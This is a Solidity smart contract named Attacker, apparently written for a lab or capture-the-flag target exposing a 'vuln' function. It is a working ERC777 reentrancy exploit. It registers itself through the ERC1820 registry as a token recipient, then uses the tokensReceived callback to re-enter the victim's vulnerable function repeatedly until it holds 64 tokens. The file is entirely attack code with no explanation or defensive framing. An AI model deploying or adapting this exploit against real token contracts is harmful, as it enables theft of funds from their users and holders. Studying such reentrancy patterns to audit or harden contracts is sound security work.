pragma solidity 0.8.7;

import "@openzeppelin/contracts/token/ERC777/IERC777Sender.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import "@openzeppelin/contracts/utils/introspection/ERC1820Implementer.sol";
interface IVictim {
	function vuln(uint256 amount) external;
	function balanceOf(address owner) external returns(uint256);
}

contract Attacker is ERC1820Implementer {

  bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;
  IERC1820Registry public registry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
  IVictim private target;
	address private owner;

  constructor(address _target) public payable {
   target = IVictim(_target);
   owner = msg.sender;
  }
  
  function exploit() external {
	   require(owner == msg.sender);
     _registerInterfaceForAddress(TOKENS_RECIPIENT_INTERFACE_HASH,address(target));
     registry.setInterfaceImplementer(
      address(this),
      TOKENS_RECIPIENT_INTERFACE_HASH,
      address(this)
    );
    target.vuln(1);
  }
  
  function tokensReceived(
   address /*operator*/,
   address from,
   address /*to*/,
   uint256 amount,
   bytes calldata /*userData*/,
   bytes calldata /*operatorData*/
  ) external {
    if(target.balanceOf(address(this)) < 64) {
  		target.vuln(1);
  	}
  }

}
